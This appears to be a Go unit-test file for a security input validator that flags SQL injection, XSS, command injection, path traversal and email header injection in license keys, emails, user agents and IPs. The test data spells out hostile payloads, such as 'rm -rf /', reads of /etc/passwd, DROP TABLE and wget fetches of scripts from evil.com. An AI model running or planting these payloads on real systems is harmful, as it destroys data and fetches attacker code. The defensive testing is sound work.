package security

import (
	"context"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// TestNewInputValidator tests validator creation and initialization
func TestNewInputValidator(t *testing.T) {
	tests := []struct {
		name   string
		config *ValidationConfig
	}{
		{
			name:   "default configuration",
			config: nil,
		},
		{
			name: "custom configuration",
			config: &ValidationConfig{
				MaxLicenseKeyLength:    512,
				MaxUsernameLength:      128,
				MaxEmailLength:         320,
				MaxUserAgentLength:     2048,
				MaxIPAddressLength:     64,
				EnableStrictValidation: true,
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			validator := NewInputValidator(tt.config)
			
			require.NotNil(t, validator)
			
			if tt.config != nil {
				assert.Equal(t, tt.config.MaxLicenseKeyLength, validator.maxLicenseKeyLength)
				assert.Equal(t, tt.config.EnableStrictValidation, validator.enableStrictValidation)
			} else {
				// Should use defaults
				assert.Equal(t, 256, validator.maxLicenseKeyLength)
				assert.True(t, validator.enableStrictValidation)
			}
			
			// Security patterns should be initialized
			assert.Greater(t, len(validator.suspiciousPatterns), 0)
			assert.Greater(t, len(validator.sqlInjectionPatterns), 0)
			assert.Greater(t, len(validator.xssPatterns), 0)
			assert.Greater(t, len(validator.commandInjectionPatterns), 0)
		})
	}
}

// TestLicenseKeyValidation tests license key validation with security checks
func TestLicenseKeyValidation(t *testing.T) {
	validator := NewInputValidator(nil)
	ctx := context.Background()

	tests := []struct {
		name            string
		licenseKey      string
		expectValid     bool
		expectSanitized string
		expectThreats   []string
		riskScoreMin    int
		description     string
	}{
		{
			name:            "valid scratch card format",
			licenseKey:      "ISX-1M23-4567-890A",
			expectValid:     true,
			expectSanitized: "ISX-1M23-4567-890A",
			expectThreats:   []string{},
			riskScoreMin:    0,
			description:     "Valid license key should pass validation",
		},
		{
			name:            "valid without dashes - normalized",
			licenseKey:      "ISX1M234567890A",
			expectValid:     true,
			expectSanitized: "ISX1M234567890A",
			expectThreats:   []string{},
			riskScoreMin:    0,
			description:     "Valid license without dashes should pass",
		},
		{
			name:        "empty license key",
			licenseKey:  "",
			expectValid: false,
			riskScoreMin: 0,
			description: "Empty license key should be rejected",
		},
		{
			name:        "SQL injection attempt",
			licenseKey:  "ISX'; DROP TABLE licenses; --",
			expectValid: false,
			expectThreats: []string{string(ThreatSQLInjection)},
			riskScoreMin: 50,
			description: "SQL injection should be detected and blocked",
		},
		{
			name:        "XSS attempt in license key",
			licenseKey:  "ISX<script>alert('xss')</script>",
			expectValid: false,
			expectThreats: []string{string(ThreatXSS)},
			riskScoreMin: 40,
			description: "XSS attempt should be detected and blocked",
		},
		{
			name:        "command injection attempt",
			licenseKey:  "ISX; rm -rf /",
			expectValid: false,
			expectThreats: []string{string(ThreatCommandInjection)},
			riskScoreMin: 60,
			description: "Command injection should be detected and blocked",
		},
		{
			name:        "path traversal attempt",
			licenseKey:  "ISX../../../etc/passwd",
			expectValid: false,
			expectThreats: []string{string(ThreatPathTraversal)},
			riskScoreMin: 35,
			description: "Path traversal should be detected",
		},
		{
			name:        "multiple threat types",
			licenseKey:  "ISX'; DROP TABLE users; <script>alert(1)</script>",
			expectValid: false,
			expectThreats: []string{string(ThreatSQLInjection), string(ThreatXSS)},
			riskScoreMin: 90,
			description: "Multiple threats should increase risk score",
		},
		{
			name:        "too long license key",
			licenseKey:  strings.Repeat("A", 300),
			expectValid: false,
			riskScoreMin: 0,
			description: "Excessively long input should be rejected",
		},
		{
			name:            "malformed UTF-8",
			licenseKey:      "ISX\xff\xfe\xfd",
			expectValid:     false,
			expectThreats:   []string{string(ThreatMalformedInput)},
			riskScoreMin:    15,
			description:     "Malformed UTF-8 should be detected",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := validator.ValidateLicenseKey(ctx, tt.licenseKey)
			
			require.NotNil(t, result)
			assert.Equal(t, tt.expectValid, result.IsValid, tt.description)
			assert.Equal(t, "license_key", result.InputType)
			
			if tt.expectValid {
				assert.Empty(t, result.Errors, "Valid input should have no errors")
				if tt.expectSanitized != "" {
					assert.Equal(t, tt.expectSanitized, result.SanitizedValue)
				}
			} else {
				if len(tt.expectThreats) > 0 {
					for _, expectedThreat := range tt.expectThreats {
						assert.Contains(t, result.ThreatTypes, expectedThreat, "Expected threat not found")
					}
				}
				if tt.riskScoreMin > 0 {
					assert.GreaterOrEqual(t, result.RiskScore, tt.riskScoreMin, "Risk score should be at least %d", tt.riskScoreMin)
				}
			}
		})
	}
}

// TestSQLInjectionDetection tests comprehensive SQL injection pattern detection
func TestSQLInjectionDetection(t *testing.T) {
	validator := NewInputValidator(nil)

	tests := []struct {
		name     string
		input    string
		expected bool
		description string
	}{
		{
			name:     "basic union select",
			input:    "' UNION SELECT * FROM users --",
			expected: true,
			description: "Basic union select should be detected",
		},
		{
			name:     "case insensitive union",
			input:    "' union all select password from admin",
			expected: true,
			description: "Case insensitive patterns should be detected",
		},
		{
			name:     "drop table attempt",
			input:    "'; DROP TABLE licenses; --",
			expected: true,
			description: "Drop table attempts should be detected",
		},
		{
			name:     "stored procedure execution",
			input:    "'; EXEC xp_cmdshell('dir'); --",
			expected: true,
			description: "Stored procedure execution should be detected",
		},
		{
			name:     "boolean logic injection",
			input:    "' OR 1=1 --",
			expected: true,
			description: "Boolean logic injection should be detected",
		},
		{
			name:     "time-based injection",
			input:    "'; WAITFOR DELAY '00:00:05' --",
			expected: false, // This specific pattern might not be in our basic set
			description: "Advanced patterns may not be detected by basic rules",
		},
		{
			name:     "legitimate SQL-like text",
			input:    "ISX database license key",
			expected: false,
			description: "Legitimate text with SQL keywords should not trigger",
		},
		{
			name:     "legitimate license key",
			input:    "ISX-1234-5678-90AB",
			expected: false,
			description: "Valid license key should not trigger SQL injection",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := validator.containsSQLInjection(tt.input)
			assert.Equal(t, tt.expected, result, tt.description)
		})
	}
}

// TestXSSDetection tests XSS pattern detection
func TestXSSDetection(t *testing.T) {
	validator := NewInputValidator(nil)

	tests := []struct {
		name     string
		input    string
		expected bool
		description string
	}{
		{
			name:     "script tag",
			input:    "<script>alert('xss')</script>",
			expected: true,
			description: "Script tags should be detected",
		},
		{
			name:     "javascript protocol",
			input:    "javascript:alert('xss')",
			expected: true,
			description: "JavaScript protocol should be detected",
		},
		{
			name:     "event handler",
			input:    "<img onload='alert(1)'>",
			expected: true,
			description: "Event handlers should be detected",
		},
		{
			name:     "iframe injection",
			input:    "<iframe src='javascript:alert(1)'></iframe>",
			expected: true,
			description: "Iframe injections should be detected",
		},
		{
			name:     "eval function",
			input:    "eval('alert(1)')",
			expected: true,
			description: "Eval function should be detected",
		},
		{
			name:     "style expression",
			input:    "style='expression(alert(1))'",
			expected: true,
			description: "Style expressions should be detected",
		},
		{
			name:     "vbscript protocol",
			input:    "vbscript:msgbox(1)",
			expected: true,
			description: "VBScript protocol should be detected",
		},
		{
			name:     "legitimate content with script word",
			input:    "JavaScript training script for developers",
			expected: false,
			description: "Legitimate content with script keyword should pass",
		},
		{
			name:     "valid license key",
			input:    "ISX-1234-5678-90AB",
			expected: false,
			description: "Valid license key should not trigger XSS",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := validator.containsXSS(tt.input)
			assert.Equal(t, tt.expected, result, tt.description)
		})
	}
}

// TestCommandInjectionDetection tests command injection pattern detection
func TestCommandInjectionDetection(t *testing.T) {
	validator := NewInputValidator(nil)

	tests := []struct {
		name     string
		input    string
		expected bool
		description string
	}{
		{
			name:     "pipe command",
			input:    "license | cat /etc/passwd",
			expected: true,
			description: "Pipe commands should be detected",
		},
		{
			name:     "semicolon command separator",
			input:    "license; rm -rf /",
			expected: true,
			description: "Semicolon command separator should be detected",
		},
		{
			name:     "background execution",
			input:    "license & wget malicious.com/script.sh",
			expected: true,
			description: "Background execution should be detected",
		},
		{
			name:     "command substitution",
			input:    "license$(id)",
			expected: true,
			description: "Command substitution should be detected",
		},
		{
			name:     "backtick execution",
			input:    "license`whoami`",
			expected: true,
			description: "Backtick execution should be detected",
		},
		{
			name:     "redirect to file",
			input:    "license > /tmp/output.txt",
			expected: true,
			description: "File redirection should be detected",
		},
		{
			name:     "windows cmd",
			input:    "license & cmd.exe /c dir",
			expected: true,
			description: "Windows command execution should be detected",
		},
		{
			name:     "powershell execution",
			input:    "license; powershell -Command Get-Process",
			expected: true,
			description: "PowerShell execution should be detected",
		},
		{
			name:     "legitimate text with command words",
			input:    "ISX command line interface license",
			expected: false,
			description: "Legitimate text with command words should pass",
		},
		{
			name:     "valid license key",
			input:    "ISX-1234-5678-90AB",
			expected: false,
			description: "Valid license key should not trigger command injection",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := validator.containsCommandInjection(tt.input)
			assert.Equal(t, tt.expected, result, tt.description)
		})
	}
}

// TestEmailValidation tests email validation with injection detection
func TestEmailValidation(t *testing.T) {
	validator := NewInputValidator(nil)
	ctx := context.Background()

	tests := []struct {
		name          string
		email         string
		expectValid   bool
		expectThreats []string
		riskScoreMin  int
		description   string
	}{
		{
			name:        "valid email",
			email:       "user@example.com",
			expectValid: true,
			description: "Valid email should pass validation",
		},
		{
			name:        "valid email with subdomain",
			email:       "user@mail.example.com",
			expectValid: true,
			description: "Valid email with subdomain should pass",
		},
		{
			name:        "valid email with plus",
			email:       "user+tag@example.com",
			expectValid: true,
			description: "Valid email with plus sign should pass",
		},
		{
			name:        "empty email",
			email:       "",
			expectValid: false,
			description: "Empty email should be rejected",
		},
		{
			name:        "invalid email format",
			email:       "not-an-email",
			expectValid: false,
			description: "Invalid email format should be rejected",
		},
		{
			name:          "email header injection with CR",
			email:         "user@example.com\r\nBcc: attacker@evil.com",
			expectValid:   false,
			expectThreats: []string{string(ThreatEmailInjection)},
			riskScoreMin:  45,
			description:   "Email header injection with CR should be detected",
		},
		{
			name:          "email header injection with LF",
			email:         "user@example.com\nCc: attacker@evil.com",
			expectValid:   false,
			expectThreats: []string{string(ThreatEmailInjection)},
			riskScoreMin:  45,
			description:   "Email header injection with LF should be detected",
		},
		{
			name:          "email header injection with content-type",
			email:         "user@example.com\r\nContent-Type: text/html",
			expectValid:   false,
			expectThreats: []string{string(ThreatEmailInjection)},
			riskScoreMin:  45,
			description:   "Content-Type injection should be detected",
		},
		{
			name:          "email header injection URL encoded",
			email:         "user@example.com%0ABcc: attacker@evil.com",
			expectValid:   false,
			expectThreats: []string{string(ThreatEmailInjection)},
			riskScoreMin:  45,
			description:   "URL encoded header injection should be detected",
		},
		{
			name:        "too long email",
			email:       strings.Repeat("a", 250) + "@example.com",
			expectValid: false,
			description: "Excessively long email should be rejected",
		},
		{
			name:          "email with XSS",
			email:         "<script>alert(1)</script>@example.com",
			expectValid:   false,
			expectThreats: []string{string(ThreatXSS)},
			riskScoreMin:  10,
			description:   "Email with XSS should be detected",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := validator.ValidateEmail(ctx, tt.email)
			
			require.NotNil(t, result)
			assert.Equal(t, tt.expectValid, result.IsValid, tt.description)
			assert.Equal(t, "email", result.InputType)
			
			if !tt.expectValid {
				if len(tt.expectThreats) > 0 {
					for _, expectedThreat := range tt.expectThreats {
						assert.Contains(t, result.ThreatTypes, expectedThreat, "Expected threat not found")
					}
				}
				if tt.riskScoreMin > 0 {
					assert.GreaterOrEqual(t, result.RiskScore, tt.riskScoreMin, "Risk score should be at least %d", tt.riskScoreMin)
				}
			}
		})
	}
}

// TestUserAgentValidation tests user agent validation with malicious pattern detection
func TestUserAgentValidation(t *testing.T) {
	validator := NewInputValidator(nil)
	ctx := context.Background()

	tests := []struct {
		name          string
		userAgent     string
		expectValid   bool
		expectWarnings []string
		riskScoreMin  int
		description   string
	}{
		{
			name:        "legitimate browser user agent",
			userAgent:   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
			expectValid: true,
			description: "Legitimate browser user agent should pass",
		},
		{
			name:        "empty user agent",
			userAgent:   "",
			expectValid: true, // Empty is allowed, defaults to "Unknown"
			description: "Empty user agent should be allowed",
		},
		{
			name:           "automated tool - curl",
			userAgent:      "curl/7.68.0",
			expectValid:    true,
			expectWarnings: []string{"automated tool detected"},
			riskScoreMin:   20,
			description:    "Automated tools should be flagged but allowed",
		},
		{
			name:           "automated tool - python",
			userAgent:      "python-requests/2.25.1",
			expectValid:    true,
			expectWarnings: []string{"automated tool detected"},
			riskScoreMin:   20,
			description:    "Python requests should be flagged as automated",
		},
		{
			name:           "bot crawler",
			userAgent:      "Googlebot/2.1 (+http://www.google.com/bot.html)",
			expectValid:    true,
			expectWarnings: []string{"automated tool detected"},
			riskScoreMin:   20,
			description:    "Bot crawlers should be flagged",
		},
		{
			name:           "malicious user agent with script",
			userAgent:      "Mozilla/5.0 <script>alert(1)</script>",
			expectValid:    true,
			expectWarnings: []string{"potentially malicious user agent"},
			riskScoreMin:   30,
			description:    "Malicious user agents should be flagged",
		},
		{
			name:           "user agent with path traversal",
			userAgent:      "Browser/1.0 ../../etc/passwd",
			expectValid:    true,
			expectWarnings: []string{"potentially malicious user agent"},
			riskScoreMin:   30,
			description:    "Path traversal in user agent should be flagged",
		},
		{
			name:        "too long user agent",
			userAgent:   strings.Repeat("A", 1100),
			expectValid: false,
			description: "Excessively long user agent should be rejected",
		},
		{
			name:           "user agent with command injection patterns",
			userAgent:      "Browser/1.0; wget http://evil.com/script.sh",
			expectValid:    true,
			expectWarnings: []string{"potentially malicious user agent"},
			riskScoreMin:   30,
			description:    "Command injection patterns should be flagged",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := validator.ValidateUserAgent(ctx, tt.userAgent)
			
			require.NotNil(t, result)
			assert.Equal(t, tt.expectValid, result.IsValid, tt.description)
			assert.Equal(t, "user_agent", result.InputType)
			
			if len(tt.expectWarnings) > 0 {
				for _, expectedWarning := range tt.expectWarnings {
					found := false
					for _, warning := range result.Warnings {
						if strings.Contains(warning, expectedWarning) {
							found = true
							break
						}
					}
					assert.True(t, found, "Expected warning '%s' not found", expectedWarning)
				}
			}
			
			if tt.riskScoreMin > 0 {
				assert.GreaterOrEqual(t, result.RiskScore, tt.riskScoreMin, "Risk score should be at least %d", tt.riskScoreMin)
			}
		})
	}
}

// TestIPAddressValidation tests IP address validation with reputation checking
func TestIPAddressValidation(t *testing.T) {
	validator := NewInputValidator(nil)
	ctx := context.Background()

	tests := []struct {
		name          string
		ipAddress     string
		expectValid   bool
		expectWarnings []string
		riskScoreMin  int
		description   string
	}{
		{
			name:        "valid IPv4",
			ipAddress:   "192.168.1.1",
			expectValid: true,
			expectWarnings: []string{"private IP address"},
			description: "Valid IPv4 should pass validation",
		},
		{
			name:        "valid IPv6",
			ipAddress:   "2001:db8::1",
			expectValid: true,
			description: "Valid IPv6 should pass validation",
		},
		{
			name:        "public IPv4",
			ipAddress:   "8.8.8.8",
			expectValid: true,
			description: "Public IPv4 should pass validation",
		},
		{
			name:        "loopback IPv4",
			ipAddress:   "127.0.0.1",
			expectValid: true,
			expectWarnings: []string{"loopback IP address"},
			description: "Loopback IP should pass with warning",
		},
		{
			name:        "empty IP address",
			ipAddress:   "",
			expectValid: false,
			description: "Empty IP address should be rejected",
		},
		{
			name:        "invalid IP format",
			ipAddress:   "999.999.999.999",
			expectValid: false,
			riskScoreMin: 25,
			description: "Invalid IP format should be rejected",
		},
		{
			name:        "too long IP",
			ipAddress:   strings.Repeat("1", 50),
			expectValid: false,
			description: "Excessively long IP should be rejected",
		},
		{
			name:        "IP with extra characters",
			ipAddress:   "192.168.1.1/24",
			expectValid: false,
			riskScoreMin: 25,
			description: "IP with CIDR notation should be invalid",
		},
		{
			name:        "malformed IPv6",
			ipAddress:   "2001:db8::gggg",
			expectValid: false,
			riskScoreMin: 25,
			description: "Malformed IPv6 should be rejected",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := validator.ValidateIPAddress(ctx, tt.ipAddress)
			
			require.NotNil(t, result)
			assert.Equal(t, tt.expectValid, result.IsValid, tt.description)
			assert.Equal(t, "ip_address", result.InputType)
			
			if len(tt.expectWarnings) > 0 {
				for _, expectedWarning := range tt.expectWarnings {
					found := false
					for _, warning := range result.Warnings {
						if strings.Contains(warning, expectedWarning) {
							found = true
							break
						}
					}
					assert.True(t, found, "Expected warning '%s' not found in %v", expectedWarning, result.Warnings)
				}
			}
			
			if tt.riskScoreMin > 0 {
				assert.GreaterOrEqual(t, result.RiskScore, tt.riskScoreMin, "Risk score should be at least %d", tt.riskScoreMin)
			}
		})
	}
}

// TestGenericInputValidation tests generic input validation with all threat types
func TestGenericInputValidation(t *testing.T) {
	validator := NewInputValidator(nil)
	ctx := context.Background()

	tests := []struct {
		name          string
		input         string
		inputType     string
		maxLength     int
		expectValid   bool
		expectThreats []string
		riskScoreMin  int
		description   string
	}{
		{
			name:        "clean input",
			input:       "This is a clean input string",
			inputType:   "text",
			maxLength:   100,
			expectValid: true,
			description: "Clean input should pass validation",
		},
		{
			name:        "input too long",
			input:       strings.Repeat("A", 150),
			inputType:   "text",
			maxLength:   100,
			expectValid: false,
			description: "Input exceeding max length should be rejected",
		},
		{
			name:          "input with SQL injection",
			input:         "user input'; DROP TABLE users; --",
			inputType:     "comment",
			maxLength:     200,
			expectValid:   true, // Sanitized but threats detected
			expectThreats: []string{string(ThreatSQLInjection)},
			riskScoreMin:  50,
			description:   "SQL injection should be detected and sanitized",
		},
		{
			name:          "input with XSS",
			input:         "Hello <script>alert('xss')</script> World",
			inputType:     "message",
			maxLength:     200,
			expectValid:   true, // Sanitized but threats detected
			expectThreats: []string{string(ThreatXSS)},
			riskScoreMin:  40,
			description:   "XSS should be detected and sanitized",
		},
		{
			name:          "input with command injection",
			input:         "filename; rm -rf /tmp",
			inputType:     "filename",
			maxLength:     100,
			expectValid:   true, // Sanitized but threats detected
			expectThreats: []string{string(ThreatCommandInjection)},
			riskScoreMin:  60,
			description:   "Command injection should be detected and sanitized",
		},
		{
			name:          "input with path traversal",
			input:         "../../etc/passwd",
			inputType:     "path",
			maxLength:     100,
			expectValid:   true, // Sanitized but threats detected
			expectThreats: []string{string(ThreatPathTraversal)},
			riskScoreMin:  35,
			description:   "Path traversal should be detected and sanitized",
		},
		{
			name:          "input with multiple threats",
			input:         "'; DROP TABLE users; <script>alert(1)</script> && rm -rf /",
			inputType:     "dangerous",
			maxLength:     200,
			expectValid:   true, // Sanitized but threats detected
			expectThreats: []string{string(ThreatSQLInjection), string(ThreatXSS), string(ThreatCommandInjection)},
			riskScoreMin:  150, // Multiple threats add up
			description:   "Multiple threats should all be detected",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := validator.ValidateGenericInput(ctx, tt.input, tt.inputType, tt.maxLength)
			
			require.NotNil(t, result)
			assert.Equal(t, tt.expectValid, result.IsValid, tt.description)
			assert.Equal(t, tt.inputType, result.InputType)
			
			if !tt.expectValid && len(result.Errors) == 0 {
				t.Errorf("Expected validation errors but got none")
			}
			
			if len(tt.expectThreats) > 0 {
				for _, expectedThreat := range tt.expectThreats {
					assert.Contains(t, result.ThreatTypes, expectedThreat, "Expected threat '%s' not found", expectedThreat)
				}
			}
			
			if tt.riskScoreMin > 0 {
				assert.GreaterOrEqual(t, result.RiskScore, tt.riskScoreMin, "Risk score should be at least %d", tt.riskScoreMin)
			}
		})
	}
}

// TestSanitizationFunctions tests input sanitization methods
func TestSanitizationFunctions(t *testing.T) {
	validator := NewInputValidator(nil)

	tests := []struct {
		name     string
		input    string
		method   func(string) string
		expected string
		description string
	}{
		{
			name:     "sanitize email - lowercase",
			input:    "USER@EXAMPLE.COM",
			method:   validator.sanitizeEmail,
			expected: "user@example.com",
			description: "Email should be converted to lowercase",
		},
		{
			name:     "sanitize email - trim spaces",
			input:    "  user@example.com  ",
			method:   validator.sanitizeEmail,
			expected: "user@example.com",
			description: "Email should have spaces trimmed",
		},
		{
			name:     "sanitize user agent - HTML encode",
			input:    "Browser/1.0 <script>alert(1)</script>",
			method:   validator.sanitizeUserAgent,
			expected: "Browser/1.0 &lt;script&gt;alert(1)&lt;/script&gt;",
			description: "User agent should be HTML encoded",
		},
		{
			name:     "sanitize IP - remove brackets",
			input:    "[2001:db8::1]",
			method:   validator.sanitizeIPAddress,
			expected: "2001:db8::1",
			description: "IPv6 brackets should be removed",
		},
		{
			name:     "sanitize generic - HTML encode",
			input:    "<div>content</div>",
			method:   validator.sanitizeGenericInput,
			expected: "&lt;div&gt;content&lt;/div&gt;",
			description: "Generic input should be HTML encoded",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := tt.method(tt.input)
			assert.Equal(t, tt.expected, result, tt.description)
		})
	}
}

// TestThreatDetectionEdgeCases tests edge cases in threat detection
func TestThreatDetectionEdgeCases(t *testing.T) {
	validator := NewInputValidator(nil)

	tests := []struct {
		name     string
		input    string
		method   func(string) bool
		expected bool
		description string
	}{
		{
			name:     "SQL injection - case variations",
			input:    "UnIoN sElEcT * FrOm UsErS",
			method:   validator.containsSQLInjection,
			expected: true,
			description: "Mixed case SQL injection should be detected",
		},
		{
			name:     "XSS - mixed quotes",
			input:    `<script type="text/javascript">alert('xss')</script>`,
			method:   validator.containsXSS,
			expected: true,
			description: "XSS with mixed quotes should be detected",
		},
		{
			name:     "Command injection - Windows style",
			input:    "cmd.exe /c dir & del *.txt",
			method:   validator.containsCommandInjection,
			expected: true,
			description: "Windows command injection should be detected",
		},
		{
			name:     "Path traversal - URL encoded",
			input:    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
			method:   validator.containsPathTraversal,
			expected: true,
			description: "URL encoded path traversal should be detected",
		},
		{
			name:     "False positive - legitimate content",
			input:    "This script helps users select the right union plan",
			method:   func(s string) bool {
				// Test that legitimate content doesn't trigger SQL injection
				return validator.containsSQLInjection(s)
			},
			expected: false,
			description: "Legitimate content with SQL keywords should not trigger",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := tt.method(tt.input)
			assert.Equal(t, tt.expected, result, tt.description)
		})
	}
}

// Benchmark tests for performance validation
func BenchmarkLicenseKeyValidation(b *testing.B) {
	validator := NewInputValidator(nil)
	ctx := context.Background()
	licenseKey := "ISX-1234-5678-90AB"

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		result := validator.ValidateLicenseKey(ctx, licenseKey)
		_ = result
	}
}

func BenchmarkSQLInjectionDetection(b *testing.B) {
	validator := NewInputValidator(nil)
	maliciousInput := "'; DROP TABLE users; SELECT * FROM admin WHERE 1=1 --"

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		result := validator.containsSQLInjection(maliciousInput)
		_ = result
	}
}

func BenchmarkInputSanitization(b *testing.B) {
	validator := NewInputValidator(nil)
	dirtyInput := "<script>alert('xss')</script> & rm -rf / && echo 'pwned'"

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		result := validator.sanitizeGenericInput(dirtyInput)
		_ = result
	}
}